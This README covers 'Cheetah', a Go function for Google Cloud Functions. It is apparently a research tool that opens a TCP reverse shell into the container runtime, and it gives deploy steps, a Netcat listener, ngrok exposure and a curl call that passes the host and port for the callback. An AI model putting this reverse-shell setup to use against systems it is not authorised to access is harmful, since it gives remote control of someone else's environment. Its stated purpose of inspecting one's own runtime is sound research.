# Puma Prey Cheetah

Cheetah is a Go function that can be deployed to the Google Cloud Platform to establish a TCP reverse shell for the purposes of introspecting the Cloud Functions container runtime.

## Installing Prerequisites

* [Node.js / NPM](https://nodejs.org/en/download/)

## Deploying The Function

```bash
export GOPATH=/PATH/TO/cheetah
cd /PATH/TO/cheetah/src/cheetah
make
```

Follow the steps at the top of the `serverless.yml` file to generate a credentials file. Modify the `serverless.yml` file to point to your GCP project ID and the **absolute path** of the credentials file.

```bash
npm install
npx serverless deploy
```

## Testing in GCP

Set up a TCP listener for your reverse shell, such as with [Netcat](http://netcat.sourceforge.net/):

```bash
nc -l 4444
```

To make your listener accessible from the public internet, consider using a service like [ngrok](https://ngrok.com/):

```bash
ngrok tcp 4444
```

Navigate to your function, supplying your connection details:

```bash
curl 'http://us-central1-YOUR_GOOGLE_CLOUD_PLATFORM_PROJECT_ID.cloudfunctions.net/Cheetah?host=YOUR_PUBLICLY_ACCESSIBLE_HOST&port=YOUR_PORT_NUMBER'
```

Your listener will now act as a reverse shell for the duration of the function invocation. You can adjust the function timeout in the serverless.yml file.

## Teardown

```bash
npx serverless remove
```

## Linting

```bash
npm run lint
```

## Serverless Go Template

Creating the original function template using the serverless framework.

```bash
cd src
serverless create --template google-go --path cheetah
```

## Exploring Further

Refer to [Serverless Docs](https://serverless.com/framework/docs/providers/google/) for more information.
